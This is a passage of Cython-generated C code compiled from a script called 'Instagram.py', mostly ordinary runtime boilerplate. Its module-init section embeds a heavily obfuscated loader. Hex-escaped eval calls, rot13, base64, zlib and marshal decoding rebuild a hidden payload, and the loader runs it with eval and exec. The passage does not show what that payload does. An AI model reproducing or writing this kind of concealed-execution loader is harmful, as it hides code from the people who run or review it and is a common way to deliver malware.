  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_n_s_god);
  __Pyx_GIVEREF(__pyx_n_s_god);
  PyTuple_SET_ITEM(__pyx_t_1, 0, __pyx_n_s_god);
  __Pyx_GIVEREF(__pyx_t_2);
  PyTuple_SET_ITEM(__pyx_t_1, 1, __pyx_t_2);
  __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_Call(__pyx_builtin_eval, __pyx_t_1, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 8, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = PyNumber_Add(__pyx_t_3, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 8, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_Globals(); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 8, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = PyTuple_New(2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 8, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_INCREF(__pyx_kp_s_codecs_decode_destiny_joy);
  __Pyx_GIVEREF(__pyx_kp_s_codecs_decode_destiny_joy);
  PyTuple_SET_ITEM(__pyx_t_3, 0, __pyx_kp_s_codecs_decode_destiny_joy);
  __Pyx_GIVEREF(__pyx_t_2);
  PyTuple_SET_ITEM(__pyx_t_3, 1, __pyx_t_2);
  __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_Call(__pyx_builtin_eval, __pyx_t_3, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 8, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = PyNumber_Add(__pyx_t_1, __pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 8, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_trust, __pyx_t_3) < 0) __PYX_ERR(0, 8, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  /* "Instagram.py":9
 * joy = '\x72\x6f\x74\x31\x33'
 * trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
 * eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))             # <<<<<<<<<<<<<<
 */
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_base64); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 9, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_b64decode); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 9, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_Globals(); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 9, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_1 = PyTuple_New(2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 9, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_n_s_trust);
  __Pyx_GIVEREF(__pyx_n_s_trust);
  PyTuple_SET_ITEM(__pyx_t_1, 0, __pyx_n_s_trust);
  __Pyx_GIVEREF(__pyx_t_3);
  PyTuple_SET_ITEM(__pyx_t_1, 1, __pyx_t_3);
  __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_Call(__pyx_builtin_eval, __pyx_t_1, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 9, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 9, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = PyTuple_New(3); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 9, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_GIVEREF(__pyx_t_1);
  PyTuple_SET_ITEM(__pyx_t_3, 0, __pyx_t_1);
  __Pyx_INCREF(__pyx_kp_s_string);
  __Pyx_GIVEREF(__pyx_kp_s_string);
  PyTuple_SET_ITEM(__pyx_t_3, 1, __pyx_kp_s_string);
  __Pyx_INCREF(__pyx_n_s_exec);
  __Pyx_GIVEREF(__pyx_n_s_exec);
  PyTuple_SET_ITEM(__pyx_t_3, 2, __pyx_n_s_exec);
  __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_compile, __pyx_t_3, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 9, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_Globals(); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 9, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_2 = PyTuple_New(2); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 9, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_GIVEREF(__pyx_t_1);
  PyTuple_SET_ITEM(__pyx_t_2, 0, __pyx_t_1);
  __Pyx_GIVEREF(__pyx_t_3);
  PyTuple_SET_ITEM(__pyx_t_2, 1, __pyx_t_3);
  __pyx_t_1 = 0;
  __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_Call(__pyx_builtin_eval, __pyx_t_2, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 9, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  /* "Instagram.py":1
 * # Kalo Mau Recode Izin Dulu bOs :v             # <<<<<<<<<<<<<<
 * import base64, codecs
 * magic = 'Xz0obGFtYmRhIHg6eCk7Y29kZT10eXBlKF8uX19jb2RlX18pO18uX19jb2RlX189Y29kZSgwLDAsMCwwLDEwLDY0LGInelx4MTZlXHgwMGVceDAxZFx4MDBceDgzXHgwMVx4YTBceDAyZVx4MDFkXHgwMVx4ODNceDAxXHhhMFx4MDNlXHgwMWRceDAyXHg4M1x4MDFceGEwXHgwNGRceDAzXHhhMVx4MDFceGExXHgwMVx4YTFceDAxXHg4M1x4MDFceDAxXHgwMFdceDAwZFx4MDRTXHgwMFx4MDRceDAwZVx4MDV5L1x4MDFceDAwWlx4MDZceDAxXHgwMHpccmVceDA3ZVx4MDhlXHgwNlx4ODNceDAxXHg4M1x4MDFceDAxXHgwMFdceDAwWVx4MDBkXHgwNFpceDA2W1x4MDZkXHgwNFNceDAwZFx4MDRaXHgwNltceDA2d1x4MDF3XHgwMCcsKCdtYXJzaGFsJywgJ3psaWInLCAnYmFzZTY0JywgYidlSnpWZkd0d0hOZVZYbmZQZXpBWXZBRUNKTUVtU0VJRUJXQUdBNEFFU0lFVVNmQWxQa0NKbEdtTjVSMDM1amFBQnViRm5oNkM2QjE0WlZQT1BoeFoxRnJaVlZaaUZ2QzZVdEZXS3J1Vi9IRTUreU5KMVZaUytaR2tVdjZSbWtwVkVqdVZqV3AvMkZWWkp6YThsbkxPdWYyYTRZQVByNzJwWU5DM2I5OCs5OUgzM3Y3dWQrNDl0MzhnTlB6NTRYZ1pqdisxRnh3bU1ERW5wQVZWVklVdGlVbmI0Z05SaExCYlF1UmozeWNvZnFQODN4Y0Y0UWU3cFZMK0g2S2JDcDNGdEVobktTM1IyWmYyMGRtZjl0TTVrQTdRT1pnTzBqbVVEc0ZaeW9YemtYUkV4RFI4dVdpK0pkMUNmbjh1bG8rbFk2SVFFVmdnM2NxQzZUZ0xwZHRZT04zT0l1a09GazEzc3BaMEY0dWx1MW5yVnMreW9MWjlLTHduc3ZoN291VnJBMTgzK2RvZFg0Zmo2d1JmTy9tNm5MQnVKNnpIU2FYVHVkdnJoSFU3WVgzUEtMZm5HZVg2bjdGOEErK0oyMks2bCsxTjk3RjliUC9iUW5vUEcyUUg0TnpQWkhZUXpnTnNpQjJDODE1Mm1CMkI4ejQyekY2QTgzNTJsSTNBZVpBZFl5L0MrUUFiWldOd2xpOEpiSndsM2haWTRvR1VQc2lTYkFKQ2g3QkhqS1I0aHhnUmE1MjNWM1JWWVRlTHhkeUYrMnEyWWhSMUNHMDdYeXdVMUt5aEZRc1hkSjJDd3FXY1lpd1Y5YndaMnZ1RmlWT3pTZHN6WVh0U3RtZlM5a3pabm1uYmM5ejJuTWpYQlBPSW5NbGtQSWNzMjE0WnZGWkExQnl1d3NXYi9NaFVaZm5OaEN4WDRYWlY1ajhlUUhKeUJyeHlBdTdCalRjVDRQQi9Ma3NCS0plaG9NeWJrQmY2NlFLOGVKMndBNkk3NGhkMnhFTTc0aGNyWDRESyt2NWI3LytLL3FNMThaalpJWit0R0N0RlhUNHB2MVkwVjVTMXFMbEh2cWhrMWNWaWNRMENYOVlwZFB6K2hoazFCK1VyaGJLaExPdEszcjJWS1M0dGFWbE55VVVyNlY5cGVaVUJBSXJyUlZQTDVaVEU5SGhTUG5wTksxVHVuNUxQRnBoZTFKaDhmRHg1U3I3OCt0azdGNjdJbjd0eGEremE1SVI4cnFMbFdJSUhXbUduNVBWN0kvTFpVaW1uM2xFWHIycEdZbnJ5eFBqa2Nmbm8xY3UzcjE4YmxYUGFtaXBmVXJOcnhSSDVjNnBlaHQ2WW1JTDh6cS9veGJ5YU9BNTVqMDlPcHFiSEo1S3o4dlhpb3BaVDVWdktrcUpyZGtwdU5jRjFFbjZwaWZIWkUwNUJqNlltRTFUWXFaa2tLMm1uNUlua1RQTCt4TXhFeWk1LzQzUEE5UjMwWGo0bHIyakhVOU1RdDJSa2J0NCtKYy9PcEdabVVsT3BrYXdYWEVOd3RNSnhIZ0gyZzdBZ1BQU1pQektFTFpIQjZ5NEtobVQ0UGhRZWtJOUpXLzVsZ016M1JDTkFrT0FIWDVCOEFTY3M2SVNGbXNpRm04aEZtc2hGbThpMU5KR0xOWkZyclpNTDJSRHRrUXZaWU0ySElDTnNSRDRFK01mNHJKMzhRZkozR0ZGd094OUZINGliUWxWZ1hmZUVoNkwrWnc5RlU2cXJqWlltdGRIU1VLcnVKbkxoSm5JOVRlU2lUZVI2NitSQ1RtMjBORHhsMzNNOXBWZ1ZyYWNjZ3BaMzVmZDQ1UHNmaFNtOTJGWXJHNkErZ3IxbEwvbmlEd1JSS0dRaGxYMlV5b1huVEdXL0o1VjVTR1dRVWxsNXpsUU9lRkk1QXFuSWxNcGRvNDFDWkNOT2NmMVlRNUJha0ZKRC8wR2UyaDM0TWVIV1U4OSt3V2gvS0c3OGMxSFlsRVRCSE5nMTNjNnE5S0h3S01MVGZnUGlia3BmbG5nYTNMOHVybVAvd2pxVDlLbTZ2aFZ0NkF0RFRwamJGdzdWeVVYSWQ3aUozSkZuVEcvNEdlVmVhSkx2MFNaeUkwNGZwRGJoVHc3UGk2M3IwLzlrMTU1NXpOTXpmVVpIMWZkQVpDK3VTVkJIUzd2VzlhamRocGlIMGJuVnRRMXQvKzcwcHIvcU03b2ZDR3pzSTJrelVQV3Y5ckR4YW9BbDNwRzJlcmVGelNCTFZvTnNvbCtnRm5oLzE5UlRQUFdIWWlIQUpvMCtpRFBWRCtoSXNmN0pyckdtZWF6Q1g3TGpkWEY4K29QbnhwRVQ3NG1Rd2t5L3NMVm5XNkNRWmpHYkljc3N4VHpadjN1c1pqaHppbUpCaWJmNm41QmZyRW5NbHlqbXhGTml4cHZFbkhONlV5ZWxjZm9KWlQ3VEpQN0xEdnJ4K0dmZCtGWS9IR0RuMlBrSDB0YmVxbS9ieG85NTh1MGpqT2g5d3JzY1pCZnNaN0xmYVFaWTRCY2UrQ0JtYkFMYXRmenRkUWpIM3h0T2YzZDZ2VXd0L3ozQU5KNUR4Sk1EK2k4MnhiUkwyNCsvUDVjcHBmL2lEWDA2dGxuSXRmK2hmeVBHeTdocm5Dczh6aHQybkVHSU05d1FKK3FKZy81WEd1SzBRNXlyRmtMMlB4OUMxdVBqeU5VYnRVQTJweXE2SGdDdVVoT2plcERPRXpxd0ZzSHNsbDh2QVpGaXFueFZsVy9xYWw2cjVJRzRwb0M0emlzbHhWaFRDa0RsZ0xCdFFPaWsyUzVmVjhxVnVzQXBNeWEvcHBhS3VnRmtjQmtDcG5mQ2tGaXVvdWhBdGMvc1JJRFhGWXRsVlQ2NUk4b2ZTM29Nc2sxTHlRbXpSNzZzNk11S1BGOVJJR1lPMHB4S0FqM3V0b0p2cXZvaWhVNWlhQnRlNTdYQzhuSUYyTnhhRkpLOXF1WVhsWndHbVJ3MER5SDNVK1N6V0xKNVRkR1ZGZlRCSTkxWlVZeXlVaXFOajQ5LzRzTUhYcm5QbHNlS0piVWdyeGhHcVh3eWtWaFh4cEYxcG1ZbVo2Wk96S1ltZ0RTZU1kVDd4dHc1cGJCOEpKVThwK1kwT0YzVHltcWhqTDd6dXBKZGc3UERRc0gvQnBlRlo4RVlXRzU0MUZiK3FDbFQrNVZtZWtzeEtwNWM0enpYU1hQMWJ5UFg2OVFta0cwYnozWnFKeWJmMFl1RlpTRHBwWXFoUjdEU0QvRG1nWWF0bEtHekxPdGEyZENWc2dadEpZT09JSnN2MmlYa09zL3NlREtaWEZjWFY0cVFMVFJldHBoUDZPb3l4RkwxaEhuWTZZUTNsTHd5S2wvSUsxcHVGUHByUWI2cGxNdnJSWjJOUjgwVDhpdmFtaUxmcWpCbFJiNEtPb2Q4UzFzdXlKV1NmRTNKVlZEeDBKWkFBQXBCOGFtRTBFdWk1bFhzV1JXbVlTZkhVbHY5REh2VGJlaURsZnZnTXlDNTBnWW9kZ1Y2YWNaTEd6eDdMYWV0eURlS2VWRDRzSDVrcy9QeDF3czZLNVdBQy9QT2puVXFYNFZjSUpIclN1VmcxSXhZYjVoOFVnZTFUTmlKeTYrQURIYnFZaGxxOTJPcDVvTzdhUjlUNyswOFErMWxWMERmR2krdGxENFdhOEVTdkNENThrNTdtZXBtVFdFS3ZxMWxwUmJHT1FQc0VEdWRkdlpYM2JzQlF3YzF0QmFvbEpWbGRXY2Mza2hzK29JaTM4WncrYmJHbERYNW5GWlc1T3R3UjFrcnEyWDVvbVpVZE9nS1dpMVVzaDQvVE0wR0NtN2FYd0FQUENsdkFBZ0lxT2d6by9JdEEycXZERUZtaTN4TzFYUEtXZ1V2WW5peHJDeFdvTFpPMXZ5clJhMVFFNCticlo1U3lpZlRJZlYrU2ROVnR0TTJyeGhLZ2ovSXVISGZxSW5ybitDMFdNMlhMeTgvQlRQT0VtYVloNS9sSFlMZTM4NTcvL1JPbTExeFZ3cjNvRDBaTk56VllrRmR3MzVHVXk0SGFsS3hYQXVXTjZBejUydUJrcTRWakZvNGs4a1ZsNHVaakg2TTBQbGNUYnhaRTYvWEFocStSRFh4Y2syOFdoTmZyL2tOTGEvV0F1V2NxcFpxZnZXK1p0U2ltWXhDT1dZeXRjaUYrMW0xaE5NN05WOU9MV0I3M3Eyb1phTmNDOTFTeTZobzYvejVsMVVEcXErTWN2QW0xcUpaU01LQTRwcVF1S0VaT2JYbXg0ZXVCZFoxelZDeGVIbTFVSUVjd2xmVkRYb09IZEYwSkpUdVdNQy9aSkl'
 */
  __pyx_t_3 = __Pyx_PyDict_NewPresized(0); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_test, __pyx_t_3) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  /*--- Wrapped vars code ---*/

  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  if (__pyx_m) {
    if (__pyx_d) {
      __Pyx_AddTraceback("init Instagram", __pyx_clineno, __pyx_lineno, __pyx_filename);
    }
    Py_CLEAR(__pyx_m);
  } else if (!PyErr_Occurred()) {
    PyErr_SetString(PyExc_ImportError, "init Instagram");
  }
  __pyx_L0:;
  __Pyx_RefNannyFinishContext();
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  return (__pyx_m != NULL) ? 0 : -1;
  #elif PY_MAJOR_VERSION >= 3
  return __pyx_m;
  #else
  return;
  #endif
}

/* --- Runtime support code --- */
/* Refnanny */
#if CYTHON_REFNANNY
static __Pyx_RefNannyAPIStruct *__Pyx_RefNannyImportAPI(const char *modname) {
    PyObject *m = NULL, *p = NULL;
    void *r = NULL;
    m = PyImport_ImportModule(modname);
    if (!m) goto end;
    p = PyObject_GetAttrString(m, "RefNannyAPI");
    if (!p) goto end;
    r = PyLong_AsVoidPtr(p);
end:
    Py_XDECREF(p);
    Py_XDECREF(m);
    return (__Pyx_RefNannyAPIStruct *)r;
}
#endif

/* PyObjectGetAttrStr */
#if CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStr(PyObject* obj, PyObject* attr_name) {
    PyTypeObject* tp = Py_TYPE(obj);
    if (likely(tp->tp_getattro))
        return tp->tp_getattro(obj, attr_name);
#if PY_MAJOR_VERSION < 3
    if (likely(tp->tp_getattr))
        return tp->tp_getattr(obj, PyString_AS_STRING(attr_name));
#endif
    return PyObject_GetAttr(obj, attr_name);
}
#endif

/* GetBuiltinName */
static PyObject *__Pyx_GetBuiltinName(PyObject *name) {
    PyObject* result = __Pyx_PyObject_GetAttrStr(__pyx_b, name);
    if (unlikely(!result)) {
        PyErr_Format(PyExc_NameError,
#if PY_MAJOR_VERSION >= 3
            "name '%U' is not defined", name);
#else
            "name '%.200s' is not defined", PyString_AS_STRING(name));
#endif
    }
    return result;
}

/* Import */
static PyObject *__Pyx_Import(PyObject *name, PyObject *from_list, int level) {
    PyObject *empty_list = 0;
    PyObject *module = 0;
    PyObject *global_dict = 0;
    PyObject *empty_dict = 0;
    PyObject *list;
    #if PY_MAJOR_VERSION < 3
    PyObject *py_import;
    py_import = __Pyx_PyObject_GetAttrStr(__pyx_b, __pyx_n_s_import);
    if (!py_import)
        goto bad;
    #endif
    if (from_list)
        list = from_list;
    else {
        empty_list = PyList_New(0);
        if (!empty_list)
            goto bad;
        list = empty_list;
    }
    global_dict = PyModule_GetDict(__pyx_m);
    if (!global_dict)
        goto bad;
    empty_dict = PyDict_New();
    if (!empty_dict)
        goto bad;
    {
        #if PY_MAJOR_VERSION >= 3
        if (level == -1) {
            if ((1) && (strchr(__Pyx_MODULE_NAME, '.'))) {
                module = PyImport_ImportModuleLevelObject(
                    name, global_dict, empty_dict, list, 1);
                if (!module) {
                    if (!PyErr_ExceptionMatches(PyExc_ImportError))
                        goto bad;
                    PyErr_Clear();
                }
            }
            level = 0;
        }
        #endif
        if (!module) {
            #if PY_MAJOR_VERSION < 3
            PyObject *py_level = PyInt_FromLong(level);
            if (!py_level)
                goto bad;
            module = PyObject_CallFunctionObjArgs(py_import,
                name, global_dict, empty_dict, list, py_level, (PyObject *)NULL);
            Py_DECREF(py_level);
            #else
            module = PyImport_ImportModuleLevelObject(
                name, global_dict, empty_dict, list, level);
            #endif
        }
    }
bad:
    #if PY_MAJOR_VERSION < 3
    Py_XDECREF(py_import);
    #endif
    Py_XDECREF(empty_list);
    Py_XDECREF(empty_dict);
    return module;
}

/* PyObjectCall */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_Call(PyObject *func, PyObject *arg, PyObject *kw) {
    PyObject *result;
    ternaryfunc call = Py_TYPE(func)->tp_call;
    if (unlikely(!call))
        return PyObject_Call(func, arg, kw);
    if (unlikely(Py_EnterRecursiveCall((char*)" while calling a Python object")))
        return NULL;
    result = (*call)(func, arg, kw);
    Py_LeaveRecursiveCall();
    if (unlikely(!result) && unlikely(!PyErr_Occurred())) {
        PyErr_SetString(
            PyExc_SystemError,
            "NULL result without error in PyObject_Call");
    }
    return result;
}
#endif

/* PyDictVersioning */
#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject *obj) {
    PyObject *dict = Py_TYPE(obj)->tp_dict;
    return likely(dict) ? __PYX_GET_DICT_VERSION(dict) : 0;
}
static CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject *obj) {
    PyObject **dictptr = NULL;
    Py_ssize_t offset = Py_TYPE(obj)->tp_dictoffset;
    if (offset) {
#if CYTHON_COMPILING_IN_CPYTHON
        dictptr = (likely(offset > 0)) ? (PyObject **) ((char *)obj + offset) : _PyObject_GetDictPtr(obj);
#else
        dictptr = _PyObject_GetDictPtr(obj);
#endif
    }
    return (dictptr && *dictptr) ? __PYX_GET_DICT_VERSION(*dictptr) : 0;
}
static CYTHON_INLINE int __Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version) {
    PyObject *dict = Py_TYPE(obj)->tp_dict;
    if (unlikely(!dict) || unlikely(tp_dict_version != __PYX_GET_DICT_VERSION(dict)))
        return 0;
    return obj_dict_version == __Pyx_get_object_dict_version(obj);
}
#endif

/* GetModuleGlobalName */
#if CYTHON_USE_DICT_VERSIONS
static PyObject *__Pyx__GetModuleGlobalName(PyObject *name, PY_UINT64_T *dict_version, PyObject **dict_cached_value)
#else
static CYTHON_INLINE PyObject *__Pyx__GetModuleGlobalName(PyObject *name)
#endif
{
    PyObject *result;
#if !CYTHON_AVOID_BORROWED_REFS
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030500A1
    result = _PyDict_GetItem_KnownHash(__pyx_d, name, ((PyASCIIObject *) name)->hash);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    } else if (unlikely(PyErr_Occurred())) {
        return NULL;
    }
#else
    result = PyDict_GetItem(__pyx_d, name);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    }
#endif
#else
    result = PyObject_GetItem(__pyx_d, name);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    }
    PyErr_Clear();
#endif
    return __Pyx_GetBuiltinName(name);
}

/* PyCFunctionFastCall */
#if CYTHON_FAST_PYCCALL
static CYTHON_INLINE PyObject * __Pyx_PyCFunction_FastCall(PyObject *func_obj, PyObject **args, Py_ssize_t nargs) {
    PyCFunctionObject *func = (PyCFunctionObject*)func_obj;
    PyCFunction meth = PyCFunction_GET_FUNCTION(func);
    PyObject *self = PyCFunction_GET_SELF(func);
    int flags = PyCFunction_GET_FLAGS(func);
    assert(PyCFunction_Check(func));
    assert(METH_FASTCALL == (flags & ~(METH_CLASS | METH_STATIC | METH_COEXIST | METH_KEYWORDS | METH_STACKLESS)));
    assert(nargs >= 0);
    assert(nargs == 0 || args != NULL);
    /* _PyCFunction_FastCallDict() must not be called with an exception set,
       because it may clear it (directly or indirectly) and so the
       caller loses its exception */
    assert(!PyErr_Occurred());
    if ((PY_VERSION_HEX < 0x030700A0) || unlikely(flags & METH_KEYWORDS)) {
        return (*((__Pyx_PyCFunctionFastWithKeywords)(void*)meth)) (self, args, nargs, NULL);
    } else {
        return (*((__Pyx_PyCFunctionFast)(void*)meth)) (self, args, nargs);
    }
}
#endif

/* PyFunctionFastCall */
#if CYTHON_FAST_PYCALL
static PyObject* __Pyx_PyFunction_FastCallNoKw(PyCodeObject *co, PyObject **args, Py_ssize_t na,
                                               PyObject *globals) {
    PyFrameObject *f;
    PyThreadState *tstate = __Pyx_PyThreadState_Current;
    PyObject **fastlocals;
    Py_ssize_t i;
    PyObject *result;
    assert(globals != NULL);
    /* XXX Perhaps we should create a specialized
       PyFrame_New() that doesn't take locals, but does
       take builtins without sanity checking them.
       */
    assert(tstate != NULL);
    f = PyFrame_New(tstate, co, globals, NULL);
    if (f == NULL) {
        return NULL;
    }
    fastlocals = __Pyx_PyFrame_GetLocalsplus(f);
    for (i = 0; i < na; i++) {
        Py_INCREF(*args);
        fastlocals[i] = *args++;
    }
    result = PyEval_EvalFrameEx(f,0);
    ++tstate->recursion_depth;
    Py_DECREF(f);
    --tstate->recursion_depth;
    return result;
}
#if 1 || PY_VERSION_HEX < 0x030600B1
static PyObject *__Pyx_PyFunction_FastCallDict(PyObject *func, PyObject **args, Py_ssize_t nargs, PyObject *kwargs) {
    PyCodeObject *co = (PyCodeObject *)PyFunction_GET_CODE(func);
    PyObject *globals = PyFunction_GET_GLOBALS(func);
    PyObject *argdefs = PyFunction_GET_DEFAULTS(func);
    PyObject *closure;
#if PY_MAJOR_VERSION >= 3
    PyObject *kwdefs;
#endif
    PyObject *kwtuple, **k;
    PyObject **d;
    Py_ssize_t nd;
    Py_ssize_t nk;
    PyObject *result;
    assert(kwargs == NULL || PyDict_Check(kwargs));
    nk = kwargs ? PyDict_Size(kwargs) : 0;
    if (Py_EnterRecursiveCall((char*)" while calling a Python object")) {
        return NULL;
    }
    if (
#if PY_MAJOR_VERSION >= 3
            co->co_kwonlyargcount == 0 &&
#endif
            likely(kwargs == NULL || nk == 0) &&
            co->co_flags == (CO_OPTIMIZED | CO_NEWLOCALS | CO_NOFREE)) {
        if (argdefs == NULL && co->co_argcount == nargs) {
            result = __Pyx_PyFunction_FastCallNoKw(co, args, nargs, globals);
            goto done;
        }
        else if (nargs == 0 && argdefs != NULL
                 && co->co_argcount == Py_SIZE(argdefs)) {
            /* function called with no arguments, but all parameters have
               a default value: use default values as arguments .*/
            args = &PyTuple_GET_ITEM(argdefs, 0);
            result =__Pyx_PyFunction_FastCallNoKw(co, args, Py_SIZE(argdefs), globals);
            goto done;
        }
    }
    if (kwargs != NULL) {
        Py_ssize_t pos, i;
        kwtuple = PyTuple_New(2 * nk);
        if (kwtuple == NULL) {
            result = NULL;
            goto done;
        }
        k = &PyTuple_GET_ITEM(kwtuple, 0);
        pos = i = 0;
        while (PyDict_Next(kwargs, &pos, &k[i], &k[i+1])) {
            Py_INCREF(k[i]);
            Py_INCREF(k[i+1]);
            i += 2;
        }
        nk = i / 2;
    }
    else {
        kwtuple = NULL;
        k = NULL;
    }
    closure = PyFunction_GET_CLOSURE(func);
#if PY_MAJOR_VERSION >= 3
    kwdefs = PyFunction_GET_KW_DEFAULTS(func);
#endif
    if (argdefs != NULL) {
        d = &PyTuple_GET_ITEM(argdefs, 0);
        nd = Py_SIZE(argdefs);
    }
    else {
        d = NULL;
        nd = 0;
    }
#if PY_MAJOR_VERSION >= 3
    result = PyEval_EvalCodeEx((PyObject*)co, globals, (PyObject *)NULL,
                               args, (int)nargs,
                               k, (int)nk,
                               d, (int)nd, kwdefs, closure);
#else
    result = PyEval_EvalCodeEx(co, globals, (PyObject *)NULL,
                               args, (int)nargs,
                               k, (int)nk,
                               d, (int)nd, closure);
#endif
    Py_XDECREF(kwtuple);
done:
    Py_LeaveRecursiveCall();
    return result;
}
#endif
#endif

/* PyObjectCallMethO */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallMethO(PyObject *func, PyObject *arg) {
    PyObject *self, *result;
    PyCFunction cfunc;
    cfunc = PyCFunction_GET_FUNCTION(func);
    self = PyCFunction_GET_SELF(func);
    if (unlikely(Py_EnterRecursiveCall((char*)" while calling a Python object")))
        return NULL;
    result = cfunc(self, arg);
    Py_LeaveRecursiveCall();
    if (unlikely(!result) && unlikely(!PyErr_Occurred())) {
        PyErr_SetString(
            PyExc_SystemError,
            "NULL result without error in PyObject_Call");
    }
    return result;
}
#endif

/* PyObjectCallOneArg */
#if CYTHON_COMPILING_IN_CPYTHON
static PyObject* __Pyx__PyObject_CallOneArg(PyObject *func, PyObject *arg) {
    PyObject *result;
    PyObject *args = PyTuple_New(1);
    if (unlikely(!args)) return NULL;
    Py_INCREF(arg);
    PyTuple_SET_ITEM(args, 0, arg);
    result = __Pyx_PyObject_Call(func, args, NULL);
    Py_DECREF(args);
    return result;
}
